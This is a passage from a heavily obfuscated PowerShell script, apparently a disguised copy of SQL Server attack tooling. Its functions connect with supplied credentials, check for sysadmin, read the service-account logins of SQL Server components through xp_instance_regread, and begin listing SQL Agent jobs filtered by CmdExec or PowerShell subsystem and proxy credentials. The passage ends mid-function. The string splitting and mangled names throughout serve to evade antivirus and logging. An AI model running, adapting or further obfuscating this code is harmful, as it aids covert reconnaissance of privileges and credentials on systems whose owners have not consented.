        HELpmESSagE = {"{1}{5}{17}{7}{11}{12}{0}{8}{2}{9}{16}{3}{6}{4}{14}{10}{15}{13}"-f'o','SQ',' ','o ','e','L Serve','auth',' or dom','unt','pa','at','ain ','acc','.','ntic','e with','ssword t','r'})]
        [string]${pA`s`s`word},

        [Parameter(maNdAToRy = ${fAL`SE},
        hElPmESSaGE = {"{0}{2}{1}{3}" -f'Windows cre','tia','den','ls.'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${cRe`De`NTiAL} =   (  VAriabLe ("045"+"9m2")  -VAlUE )::"eMp`Ty",

        [Parameter(mANDatORy = ${f`Alse},
                VALUefromPIpelIneBypROPerTYnaME = ${t`Rue},
        heLpmeSSAGE = {"{1}{6}{0}{2}{8}{9}{3}{5}{4}{7}" -f ' Serv','SQ','e',' t',' ','o connection','L','to.','r in','stance'})]
        [string]${INs`TANce},

        [Parameter(MANdatory = ${F`AlsE},
        heLPMEsSAGe = {"{3}{0}{5}{6}{7}{8}{9}{4}{11}{2}{10}{12}{1}" -f're','.',' ','Supp','n','ss verbose',' erro','rs.  Used ','when fu','nctio','wrapp',' is','ed'})]
        [switch]${su`P`p`REsSVe`RbOSe}
    )

    Begin
    {
        
        ${Tb`lS`ErViCE`ACc`ou`NT} = &("{3}{1}{2}{0}"-f 't','Obj','ec','New-') -TypeName ("{5}{0}{4}{2}{3}{1}"-f'.','ble','ta.D','ataTa','Da','System')
    }

    Process
    {
        

        
        ${cO`mput`eRNAme} = &("{0}{2}{3}{5}{4}{1}" -f 'Get','e','-Compu','terNa','c','meFromInstan') -Instance ${I`NsT`ANCE}

        
        if(-not ${ins`TAn`ce})
        {
            ${I`NSt`AncE} = ${enV:cOm`p`U`TErnAMe}
        }

        
        ${TESTc`onne`C`T`IoN} = &("{5}{1}{4}{2}{3}{0}"-f 'tionTest','et-','nn','ec','SQLCo','G') -Instance ${iN`STa`NcE} -Username ${USeRN`A`ME} -Password ${Pa`Ss`WOrd} -Credential ${C`ReDenTI`Al} -SuppressVerbose | &("{0}{1}{2}"-f'Where','-Obje','ct') -FilterScript {
            ${_}."s`TaTUS" -eq ("{0}{1}{2}" -f'Ac','c','essible')
        }
        if(${tES`T`coNNec`Tion})
        {
            if( -not ${sU`p`PR`E`SsveRboSE})
            {
                &("{3}{2}{0}{1}"-f'e-Verbos','e','t','Wri') -Message ("$Instance "+': '+'C'+'onn'+'ection '+'Suc'+'ces'+'s.')
            }
        }
        else
        {
            if( -not ${s`UPPReSs`V`ErbOsE})
            {
                &("{3}{1}{0}{2}" -f 'bos','r','e','Write-Ve') -Message ("$Instance "+': '+'Con'+'ne'+'ction '+'F'+'aile'+'d.')
            }
            return
        }

        
        ${issys`Adm`IN} = &("{3}{1}{0}{4}{2}"-f'sadminCh','QLSy','ck','Get-S','e') -Instance ${INst`A`NCe} -Credential ${CRED`EN`T`IAL} -Username ${USEr`N`AME} -Password ${P`Assw`orD} -SuppressVerbose | &("{2}{1}{0}{3}" -f'c','le','Se','t-Object') -Property ("{1}{2}{0}" -f'n','IsS','ysadmi') -ExpandProperty ("{1}{0}{2}"-f'sSy','I','sadmin')

        if(${Is`sYs`A`DMIn} -eq 'Yes')
        {
            ${S`YSADm`InSE`T`UP} = ((("{40}{8}{21}{37}{33}{38}{22}{35}{26}{34}{41}{2}{6}{32}{39}{36}{11}{5}{3}{23}{0}{24}{29}{18}{42}{20}{7}{1}{19}{4}{13}{30}{25}{14}{43}{12}{17}{31}{27}{9}{28}{16}{10}{15}" -f ' ','1}, @MSOLAPInstan','tatic Location
    ','{1}HKEY_LOCAL_MACHINE{1},
 ','              N{1}ObjectName{1},@AnalysisLogin OUTPUT

                -- Get Reporting - Calculated
          ','              @rootkey      = N','            EXECUTE       maste','       EXECUTE		master.dbo.xp_instance_regread
                N{1}HKEY_LOCAL_MACHINE{',' =','SQL Server DTS Server / Analysis - Calulated
   ','HK',' ','         ','      EXECUTE		master.dbo.xp_instance_regr','ACH','EY_LOCAL_MACHINE{1}, @IntegrationVersion,
            N{1}ObjectName{1},@IntegrationDtsLogin OUTPUT','                N{1}','     N{1}Object','value        = @WriterLogin OUTPUT

                -- Get M','ce,
  ',' - Calculated
         ',' N{1}HKEY_LOCAL_MACHINE{1},
   ','er{1},
       ',' ','             @key          = N{1}SYSTEM{0}CurrentControlSet{0}Services{0}SQLWriter{1},
                @value_na',' N{1}HKEY_LOCAL_M','}ObjectName{1},
                @value        =','UT

                -- Get ','             EXECUTE		master.dbo.xp_instance_regread
','me   = N{1}ObjectName{1},
                @','ead
               ','Name{1},@ReportLogin OUTP','r.dbo','   = N{1}SYSTEM{0}CurrentContro',' @BrowserLo','         @value_name   = N{1','_regread
 ','             @key       ','lSet{0}Services{0}SQLBrows','.xp_instance','
                -- Get SQL Server Browser - Static Location
                EXECUTE       master.dbo.xp_instance_regread
                @rootkey     ','gin OUTPUT

                -- Get SQL Server Writer - S','SOLAP','INE{1}, @ReportInstance,
  ')) -f [CHAr]92,[CHAr]39)

            ${s`Ys`ADMI`N`QuerY} = ("{32}{42}{38}{15}{46}{16}{26}{18}{40}{31}{4}{6}{1}{3}{34}{43}{33}{23}{45}{29}{41}{11}{20}{8}{9}{7}{10}{19}{22}{36}{37}{44}{12}{24}{25}{30}{14}{35}{27}{2}{0}{5}{28}{39}{17}{13}{21}" -f'te','  ','In',' ','gin','gratio',',
   ','Login] = ','ys','is','@A',' [Ana','     [Rep','i','] = @ReportLogin,
            ','in] =','ro','Log','e','n','l','n','alysi',' @WriterLogin,
  ','ortL','ogi','ws','Login] = @','nD','      ','n','o','	,[','] =','  ','[Integration','sLo','gin,
 ','rowserLog','ts','rL','     ','B','        [WriterLogin','          ','  ',' @B')
        }
        else
        {
            ${s`y`sad`MiNsetuP} = ''
            ${SY`s`ADmInQUErY} = ''
        }

        
        ${QU`eRy} = (' '+' '+'-'+'- '+'Se'+'tup '+'var'+'iables
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'DEC'+'LARE	'+'	@SQLSer'+'v'+'er'+'In'+'s'+'tance'+'	V'+'AR'+'CH'+'AR(250)
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'DE'+'CLA'+'RE		@'+'MSOLAPInstan'+'ce	'+'	'+'VA'+'RCHAR(25'+'0)
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'DECLA'+'RE		@Rep'+'o'+'rtIns'+'tan'+'ce '+'	V'+'ARCHAR(2'+'50)
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'DEC'+'LARE		@Age'+'ntInsta'+'nce'+'	 '+'	VAR'+'CHAR'+'(250)'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'D'+'E'+'CL'+'A'+'R'+'E		@Integ'+'rati'+'onVersion'+'	V'+'ARCHAR(250)
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'DEC'+'LARE		@'+'DBEngineL'+'ogin'+'		V'+'A'+'RCHAR(1'+'00)
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'DECLAR'+'E'+'		@A'+'gentLogi'+'n'+'		'+' '+' '+' '+' '+'VA'+'RCH'+'AR('+'100)
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'DECLAR'+'E	'+'	@B'+'rowse'+'rL'+'o'+'gin	'+'	VARC'+'HAR('+'100)
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'D'+'ECLARE '+' '+' '+' '+' '+'@'+'W'+'riterLogin	'+'	'+'V'+'ARC'+'HAR(1'+'00)
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'D'+'ECL'+'ARE		@AnalysisLogin'+'		VA'+'RCHAR(10'+'0'+')
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'DE'+'CLARE	'+'	@Rep'+'ortL'+'ogi'+'n		VA'+'RCHAR(100)'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'DECLA'+'RE'+'		@I'+'ntegr'+'ationDtsLogin	VARCH'+'AR(1'+'0'+'0'+')

 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'-'+'- '+'G'+'et '+'Serv'+'ic'+'e '+'Path'+'s '+'f'+'or '+'defau'+'lt'+' '+'and'+' '+'name'+' '+'instanc'+'e'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'i'+'f '+'@@S'+'ERV'+'ICEN'+'AME '+'= '+('S7BMS'+'SQLSERV'+'ERS'+'7B ')."rEpL`A`CE"('S7B',[sTring][CHar]39)+'or'+' '+'@@SE'+'RVICE'+'NA'+'ME '+'= '+'HO'+'ST_'+'NAME()
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'BEG'+'IN
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'--'+' '+'D'+'e'+'fault '+'inst'+'ance '+'paths'+'
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'se'+'t '+'@SQ'+'LServe'+'rI'+'n'+'s'+'tance '+'= '+('Y'+'F'+'1S'+'Y'+'STE'+'M'+'i7uCur'+'rentCo'+'n'+'trolSeti7uS'+'ervi'+'ce'+'si'+'7u'+'MSSQLSERV'+'ERYF1'+'
'+' ')."R`ePLACE"(([ChAR]89+[ChAR]70+[ChAR]49),[StriNG][ChAR]39)."rEpLa`cE"('i7u',[StriNG][ChAR]92)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'set'+' '+'@'+'MS'+'OLAPIns'+'tance '+'= '+('{0}S'+'YS'+'T'+'E'+'M{1}Curren'+'tC'+'o'+'ntrolS'+'e'+'t{1}Servic'+'es{1}'+'MSS'+'QL'+'ServerOLAPSe'+'rvi'+'c'+'e{0}
 ')-f[cHar]39,[cHar]92+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'set'+' '+'@Repor'+'tIns'+'ta'+'nce '+'= '+('Eob'+'SYSTEMg1zCurren'+'tControl'+'Setg1zServic'+'esg'+'1z'+'ReportSer'+'verE'+'ob
'+' ')."R`e`pLACe"(([chAR]69+[chAR]111+[chAR]98),[stRING][chAR]39)."Re`P`lAce"(([chAR]103+[chAR]49+[chAR]122),'\')+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'set'+' '+'@AgentI'+'nsta'+'nc'+'e '+'= '+('7VISYST'+'E'+'MiF'+'7CurrentCo'+'ntr'+'o'+'lSetiF7Se'+'rvic'+'e'+'s'+'iF7S'+'QLSER'+'VE'+'RAG'+'ENT7VI'+'
 ')."RE`PlA`ce"(([CHaR]105+[CHaR]70+[CHaR]55),[StRiNg][CHaR]92)."Re`pla`cE"('7VI',[StRiNg][CHaR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'s'+'et '+'@Int'+'eg'+'rat'+'ion'+'Versio'+'n '+' '+'= '+('{'+'1'+'}'+'S'+'YSTEM{0}Cur'+'rent'+'Con'+'trol'+'Se'+'t'+'{0}Se'+'rvices{0}M'+'s'+'D'+'tsServer{1'+'}+ ')  -F[char]92,[char]39+('SUB'+'ST'+'RI'+'N'+'G(CAST'+'(SERVERPRO'+'PERTY('+'{0}p'+'r'+'oduc'+'tv'+'ersion{0}) ')-f  [Char]39+'AS'+' '+'VA'+'RCHA'+'R'+'(255)),0, '+'3)'+' '+'+ '+(('A9'+'R0A9R'+'
 ') -ReplAcE([Char]65+[Char]57+[Char]82),[Char]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'END'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'EL'+'S'+'E
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'BE'+'G'+'IN
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'--'+' '+'N'+'a'+'med '+'in'+'stan'+'ce'+' '+'pa'+'ths'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'se'+'t '+'@SQLS'+'er'+'ver'+'Insta'+'nce '+'= '+"'SYSTEM\CurrentControlSet\Services\MSSQL$' "+'+ '+'cast'+'('+'@@SE'+'RV'+'ICENAM'+'E '+'as'+' '+'v'+'archar('+'25'+'0)'+')
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'se'+'t '+'@MSO'+'LA'+'PInst'+'ance '+'= '+"'SYSTEM\CurrentControlSet\Services\MSOLAP$' "+'+ '+'cast(@@'+'SERV'+'ICE'+'N'+'AME '+'as'+' '+'v'+'ar'+'char('+'250)'+')
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'set'+' '+'@Rep'+'ortI'+'nstance'+' '+'= '+"'SYSTEM\CurrentControlSet\Services\ReportServer$' "+'+ '+'cast'+'(@@SERV'+'ICEN'+'AME '+'as'+' '+'varch'+'ar(25'+'0))'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'set'+' '+'@A'+'gent'+'In'+'st'+'ance '+'= '+"'SYSTEM\CurrentControlSet\Services\SQLAgent$' "+'+ '+'cast(@@'+'S'+'ER'+'VI'+'CENAM'+'E '+'as'+' '+'va'+'r'+'char'+'(250))
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'se'+'t '+'@Integr'+'a'+'tio'+'nVersi'+'on '+' '+'= '+('{0}SY'+'S'+'TEM{'+'1'+'}C'+'urren'+'tCon'+'tr'+'ol'+'Set'+'{1'+'}'+'Se'+'rv'+'ices'+'{1}MsDtsS'+'erver{0}+ ')  -f [ChAR]39,[ChAR]92+('S'+'UB'+'STRI'+'NG(CAST(SERVE'+'RP'+'ROPE'+'R'+'TY('+'mWqproductversi'+'onmWq) ')."rE`plAcE"('mWq',[stRiNG][ChaR]39)+'AS'+' '+'VARCHAR'+'(255'+')),'+'0, '+'3)'+' '+'+ '+('ocg0ocg'+'
'+' ')."repla`Ce"('ocg',[STrInG][CHAR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'END
'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'-'+'- '+'Get'+' '+'SQL'+' '+'Se'+'rver'+' '+'- '+'Calc'+'ulate'+'d
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'E'+'XECU'+'TE		ma'+'ster.'+'dbo.xp_in'+'s'+'t'+'a'+'n'+'ce_'+'r'+'egread
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+(('Nm'+'z4HK'+'EY_LO'+'C'+'AL_'+'MAC'+'H'+'INE'+'mz4, ')-cREPlacE  'mz4',[Char]39)+'@SQ'+'LServ'+'e'+'r'+'Insta'+'nc'+'e,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+(('N'+'0'+'OuOb'+'jectNa'+'me0Ou,@'+'DBE'+'ngi'+'n'+'eLogin ')  -REplAcE  ([cHaR]48+[cHaR]79+[cHaR]117),[cHaR]39)+'OUTPUT'+'

'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'-'+'- '+'G'+'et '+'SQL'+' '+'Serv'+'er '+'Agen'+'t '+'- '+'Ca'+'lcul'+'ate'+'d
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'E'+'X'+'ECUTE'+'		ma'+'s'+'t'+'er.d'+'b'+'o.xp_instance'+'_r'+'egread'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('NWKwHKEY_L'+'O'+'CAL_'+'MACH'+'INEWKw, ')."R`E`PLace"('WKw',[StRiNg][Char]39)+'@'+'Age'+'ntInstance,'+'
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('N'+'wi'+'V'+'O'+'bjectNamewi'+'V,'+'@Age'+'ntLo'+'gi'+'n ')."RE`PlAcE"(([char]119+[char]105+[char]86),[sTrinG][char]39)+'O'+'U'+'TPUT

 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$SysadminSetup

 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'--'+' '+'Dis'+'lp'+'ay '+'res'+'ults'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"SELECT		'$ComputerName' "+'a'+'s '+'[Com'+'pute'+'rNam'+'e],
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$Instance' "+'a'+'s '+'[I'+'nst'+'ance],'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'[D'+'BE'+'ng'+'ineLogin] '+'= '+'@DBE'+'ngi'+'neLogin'+','+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'[Age'+'n'+'tLo'+'gin] '+'= '+'@AgentL'+'o'+'gin
 '+' '+' '+' '+' '+' '+' '+' '+"$SysadminQuery")

        
        ${t`B`lrEs`UlTs} = &("{0}{1}{2}" -f 'Ge','t-SQLQuer','y') -Instance ${INst`AN`cE} -Query ${Q`Ue`Ry} -Username ${U`SErNAme} -Password ${PaSsw`Ord} -Credential ${CReD`eNt`I`AL} -SuppressVerbose

        
        ${tb`ls`Erv`icEA`CcoUnT} = ${t`BLS`erVICeACCoU`Nt} + ${Tb`lrE`su`lTs}
    }

    End
    {
        
        

        
        ${Tb`LNewo`BjEcT} = &("{0}{2}{1}" -f 'N','w-Object','e') -TypeName ("{4}{2}{5}{0}{1}{3}" -f 'm.','Data.D','y','ataTable','S','ste')
        ${N`ULL} = ${Tbln`EWOb`j`ECT}."c`oLUm`NS".("{0}{1}"-f 'Ad','d').Invoke(("{1}{3}{0}{2}" -f'terN','Com','ame','pu')) 
        ${n`ULL} = ${TBl`N`eW`o`BJECT}."C`olumNs".("{0}{1}" -f 'Ad','d').Invoke(("{2}{1}{0}" -f'ce','n','Insta')) 
        ${n`UlL} = ${TBLN`eWo`BJECT}."c`olum`NS".("{0}{1}" -f 'Ad','d').Invoke(("{3}{1}{2}{0}" -f 'eType','ervi','c','S')) 
        ${Nu`ll} = ${TBln`EWOBJ`e`cT}."c`OLU`Mns".("{1}{0}"-f 'd','Ad').Invoke(("{2}{1}{4}{0}{3}" -f 'ccou','ervic','S','nt','eA'))
        
        
        ${tBL`N`Ewo`Bj`ecT}."ro`wS".("{0}{1}"-f 'Ad','d').Invoke(${tBL`SE`RVice`ACCOUNt}."co`MP`UTEr`NAme",${tb`LseR`VicE`AccOuNT}."I`NST`ANcE",("{0}{1}{3}{2}" -f'Ag','en','ce','tServi'),${Tb`lSErv`i`c`EACCounT}."AG`EnT`LOGIN")
        ${Tb`l`N`EWobJE`cT}."r`oWS".("{0}{1}"-f 'A','dd').Invoke(${Tb`LsE`R`VicEA`CC`Ount}."CO`mP`UT`erNaME",${tBLs`eRvIceacCo`U`Nt}."iN`stA`NcE",("{2}{0}{1}" -f 'sSe','rvice','Analysi'),${t`BlseR`VIcE`ACc`ount}."AnA`l`YSIsl`o`GIn")
        ${TBL`NEw`Obj`ect}."RO`wS".("{0}{1}"-f'Ad','d').Invoke(${TBl`SERVICe`A`CCOunT}."C`OMPuTe`RN`AmE",${Tb`LSer`VIc`eACcOu`NT}."INStA`NCE",("{0}{2}{3}{4}{1}"-f'Brow','Service','s','e','r'),${T`BlservI`c`EACcoUnt}."browSEr`log`In")
        ${t`BLnEWOB`J`Ect}."R`ows".("{1}{0}"-f'd','Ad').Invoke(${tBLsE`Rvi`C`eAC`COUNt}."Comp`U`TErNa`Me",${tBL`Ser`V`iCe`AccouNT}."I`NsTa`NCE",("{0}{1}{2}"-f'SQLS','ervic','e'),${T`BlSeRV`I`cE`ACcOUNt}."db`EnG`in`ElOGiN")
        ${T`BLn`Ew`OBjE`cT}."R`oWs".("{0}{1}"-f'Ad','d').Invoke(${tB`lSeRVi`CEA`C`COUNt}."Co`M`pU`TeRnaME",${TBlS`ER`VicEA`CC`ounT}."I`N`StANce",("{1}{3}{2}{0}"-f'ce','In','rationServi','teg'),${t`Bl`SERVi`Ce`ACc`OUNt}."Int`eGrA`TiOnlo`G`in")
        ${tBlN`ewoBj`E`CT}."ro`wS".("{0}{1}" -f'Ad','d').Invoke(${tblSE`R`V`icEaCcOu`Nt}."C`oMP`Ute`RNAme",${TB`Ls`eRv`ICEacC`ouNt}."I`Ns`TANCe",("{2}{1}{3}{0}" -f'rvice','t','Repor','Se'),${TB`LserViCEAc`c`O`UNt}."rE`pORt`lO`GIN")
        ${T`BlNewoB`j`eCT}."Ro`WS".("{0}{1}"-f 'Ad','d').Invoke(${tbL`SE`Rvi`c`Ea`ccouNT}."COMP`U`TERnaME",${t`Bl`SEr`VIcEaCCoUNT}."In`S`TANcE",("{2}{3}{0}{1}" -f 'rSe','rvice','W','rite'),${t`BLseRvIC`eAcc`oU`Nt}."Wr`ITeRLo`G`IN")
        ${TBl`NEwoBj`ECt}
    }
}





Function  G`et`-sqlA`GEN`TjoB
{
    
    [CmdletBinding()]
    Param(
        [Parameter(MAnDATOry = ${fal`sE},
        HELpMEsSaGe = {"{5}{1}{0}{6}{4}{7}{8}{2}{3}"-f'n ac','erver or domai','te with','.','authe','SQL S','count to ','nt','ica'})]
        [string]${U`s`eRNA`ME},

        [Parameter(mANdaTOry = ${Fa`L`sE},
        helpmesSAgE = {"{0}{2}{6}{9}{7}{4}{8}{10}{3}{1}{5}"-f'SQL ','w','Server or domain account pass','icate ','u','ith.','w',' to a','then','ord','t'})]
        [string]${paS`SwO`RD},

        [Parameter(maNDatoRY = ${FAl`SE},
        HELPMESsaGe = {"{4}{0}{1}{2}{5}{6}{3}" -f 'c','r','ed','s.','Windows ','entia','l'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${cRe`DeN`TiaL} =   ( DIr  ('vAR'+'I'+'ABLE:0'+'459m2') ).valUe::"em`pTY",

        [Parameter(ManDaTOry = ${fa`lSE},
                VaLUefRoMPIpeLine = ${tR`Ue},
                vaLueFroMPIpelInEbYPRoPERTynamE = ${tR`UE},
        HelPMeSsaGE = {"{0}{5}{7}{1}{4}{8}{3}{2}{6}"-f'SQL ','nc','ion t','nect','e to','Server ins','o.','ta',' con'})]
        [string]${I`NS`TanCe},

        [Parameter(MANDATOrY = ${fal`se},
        heLPMessaGe = {"{3}{7}{8}{6}{9}{1}{0}{2}{4}{5}{10}{11}" -f 'c','r spe','if','Only','ic s','ubs','o',' return ','SQL Agent j','bs fo','yst','ems.'})]
         [ValidateSet({"{1}{0}" -f 'SQL','T'},{"{2}{1}{0}"-f 'erShell','ow','P'},{"{0}{2}{1}" -f'C','DEXEC','M'},{"{1}{2}{0}" -f'l','Powe','rShel'},{"{3}{2}{0}{1}{4}" -f'ri','pti','iveSc','Act','ng'},{"{0}{3}{2}{1}" -f'ANALYS','D','SCOMMAN','I'},{"{2}{0}{1}{3}"-f'SISQUE','R','ANALY','Y'},{"{0}{1}" -f'Snapsho','t'},{"{0}{1}{2}" -f'Distribu','ti','on'},{"{1}{0}{2}"-f 'g','Lo','Reader'},{"{0}{1}"-f'M','erge'},{"{1}{2}{0}" -f'eader','Q','ueueR'})]
        [String]${Sub`syst`EM},

        [Parameter(mANDAtory = ${fal`se},
        HElpMEssAgE = {"{6}{0}{13}{4}{2}{3}{8}{12}{7}{5}{14}{1}{11}{10}{9}" -f'that ha','a spec','m','a','om','cl','Only return SQL Agent jobs ','n','nd tha','rd.','ic keywo','if','t i','ve a c','udes '})]
        [String]${K`e`yWORd},

        [Parameter(MAndAToRy = ${Fal`SE},
        HElPmessagE = {"{8}{13}{7}{10}{2}{6}{3}{0}{4}{1}{11}{5}{12}{9}" -f's','sing a proxy cre','e','ob',' u','ntial','nt j','n SQL A','Only re','.','g','de','s','tur'})]
        [Switch]${Usi`Ng`P`R`OXycRE`DEN`Tial},

        [Parameter(MANdAtorY = ${Fa`L`sE},
        HELPmesSaGe = {"{4}{11}{0}{8}{10}{3}{1}{6}{12}{14}{7}{13}{2}{5}{9}" -f' retu','us','r','jobs ','Onl','edenti','ing','roxy','rn SQL A','al.','gent ','y',' a specif',' c','ic p'})]
        [String]${proXyc`Re`DEnT`IAl},
        
        [Parameter(mAndaToRY = ${FA`L`sE},
        HElpMessaGE = {"{1}{7}{3}{6}{5}{2}{4}{0}" -f'onnection.','Co','e','g','d Admin C','icat',' Ded','nnect usin'})]
        [Switch]${d`Ac},

        [Parameter(maNDatoRy = ${FA`lsE},
        hELpmessaGe = {"{1}{0}{2}{3}{4}" -f'tion','Connec',' timeo','ut','.'})]
        [string]${T`Imeo`Ut},

        [Parameter(MANDatorY = ${f`AL`sE},
        HelpMESsAGe = {"{8}{4}{9}{0}{3}{1}{10}{6}{2}{11}{5}{7}" -f'ose e',' ','wra','rrors.  Used when','upp','p','unction is ','ed.','S','ress verb','f','p'})]
        [switch]${sUpp`ReSsvEr`Bo`se}
    )

    Begin
    {
        if(-not ${SupPrEss`VE`Rbo`SE}){
            &("{2}{3}{1}{0}" -f 'e','s','W','rite-Verbo') -Message ("{7}{3}{9}{1}{4}{2}{10}{11}{5}{0}{8}{6}" -f'artin','e','Job Sea','QL Ser','nt ','St','..','S','g.','ver Ag','rc','h ')
        }

        
        ${T`Bl`ReSuL`Ts} = &("{2}{0}{1}" -f'O','bject','New-') -TypeName ("{0}{1}{2}{3}"-f'Sys','tem','.Data.Data','Table')
        ${nu`lL} = ${tB`L`RESuLtS}."cOL`UmNS".("{0}{1}"-f 'Ad','d').Invoke(("{3}{2}{0}{1}" -f'erNa','me','t','Compu'))
        ${N`ULL} = ${t`BlR`EsultS}."cO`L`Umns".("{0}{1}"-f'Ad','d').Invoke(("{2}{1}{0}"-f 'ance','st','In'))     
        ${n`UlL} = ${T`B`lreS`UltS}."C`oLUM`NS".("{0}{1}"-f 'Ad','d').Invoke(("{1}{0}{3}{2}" -f 'bas','Data','ame','eN'))
        ${n`UlL} = ${TbLRE`S`UlTs}."c`O`lUmNs".("{0}{1}"-f 'A','dd').Invoke(("{1}{0}"-f '_Id','Job'))                                                                                                                                                                                        
        ${n`ULL} = ${TblR`eSU`lTs}."cOlu`M`Ns".("{0}{1}" -f 'A','dd').Invoke(("{1}{0}{2}" -f 'ob_','J','Name'))                                                                                                                                                                                                 
        ${Nu`Ll} = ${Tb`LRes`Ul`Ts}."C`OlUm`NS".("{1}{0}"-f'd','Ad').Invoke(("{1}{3}{0}{4}{2}"-f'c','J','tion','ob_Des','rip'))  
        ${n`ULl} = ${tb`lreSU`l`Ts}."coL`Um`NS".("{1}{0}" -f'd','Ad').Invoke(("{2}{1}{0}" -f 'er','b_Own','Jo'))
        ${n`ULL} = ${tBL`ReS`ULts}."c`OlumNs".("{1}{0}"-f 'dd','A').Invoke(("{2}{1}{0}"-f '_Id','oxy','Pr'))  
        ${n`ULl} = ${tBlREs`UL`TS}."CO`LuMns".("{1}{0}"-f 'd','Ad').Invoke(("{1}{2}{0}" -f 'edential','P','roxy_Cr'))                                                                                                                                                                                                          
        ${n`ULL} = ${tblr`es`ULtS}."coL`U`mNS".("{0}{1}" -f 'Ad','d').Invoke(("{0}{2}{1}"-f 'Date_Creat','d','e')) 
        ${NU`lL} = ${Tb`lREsu`L`Ts}."cOLUM`NS".("{1}{0}" -f'dd','A').Invoke(("{0}{1}{2}" -f'La','st_Run_D','ate'))
        ${NU`Ll} = ${T`B`lre`sUltS}."cOL`U`mNS".("{0}{1}" -f 'A','dd').Invoke(("{0}{1}" -f'En','abled'))                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
        ${n`ULl} = ${T`Bl`Re`SUlTS}."Co`lUMNs".("{1}{0}" -f'dd','A').Invoke(("{0}{1}"-f 'S','erver'))                                                                                                                                                                                        
        ${NU`Ll} = ${tB`lrEsUl`Ts}."COLu`Mns".("{0}{1}"-f'A','dd').Invoke(("{1}{0}"-f 'me','Step_Na'))
        ${n`UlL} = ${Tblr`e`SuLts}."coL`U`mnS".("{0}{1}"-f'A','dd').Invoke(("{2}{1}{0}" -f'em','Syst','Sub'))
        ${nU`ll} = ${Tb`l`RESultS}."c`OLUmNs".("{0}{1}" -f 'A','dd').Invoke(("{0}{1}"-f 'C','ommand'))          
        
        
        if(${S`UBsy`StEm})
        {
            ${Sub`sYS`T`EmFI`lteR} = (' '+'and'+' '+'steps.sub'+'s'+'y'+'ste'+'m '+'l'+'ike '+"'$SubSystem'")
        }
        else
        {
            ${S`UBsUS`TEM`Fi`LteR} = ''
        }    
        
        
        if(${kE`YWo`RD})
        {
            ${K`eYworD`FI`LTeR} = (' '+'and'+' '+'ste'+'ps.comman'+'d '+'like'+' '+"'%$Keyword%'")
        }
        else
        {
            ${kEyW`Or`df`ilTER} = ''
        }   

        
        if(${U`SINgPRox`Yc`RE`dE`NTI`AL})
        {
            ${usiNgPr`o`x`ycrEDFI`LTER} = ("{2}{1}{5}{4}{0}{3}" -f'xy_id > ','and s',' ','0','s.pro','tep')
        }
        else
        {
            ${u`Si`Ngp`RoXYcr`E`dFIlter} = ''
        } 
        
        
        if(${p`R`oxyc`REdE`NtIal})
        {
            ${Pro`Xy`C`R`ed`FILtER} = (' '+'a'+'nd '+'proxi'+'es.na'+'me '+'li'+'ke '+"'$ProxyCredential'")
        }
        else
        {
            ${Pr`oXy`CReDfILTer} = ''
        }                                                                                                                                                                                                 
    }

    Process
    {
        
        if(-not ${IN`S`T`AnCe})
        {
            ${iN`ST`ANCe} = ${EnV:C`OmPut`E`R`NAMe}
        }

        
        if(${d`AC})
        {
            
